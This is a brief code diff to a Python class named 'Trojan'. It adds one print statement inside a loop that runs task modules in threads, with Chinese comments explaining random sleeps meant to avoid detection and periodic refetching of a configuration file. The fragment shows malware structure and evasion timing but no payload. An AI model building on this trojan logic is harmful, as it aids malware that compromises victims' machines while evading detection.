@@ -70,6 +70,7 @@ class Trojan:
                 thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                 thread.start()
                 time.sleep(random.randint(1, 10))  # 随机等待一段时间，防止被发现
+                print('done.')
 
             time.sleep(random.randint(30 * 60, 3 * 60 * 60))  # 随机等待30分钟到3小时，再次获取配置文件
 
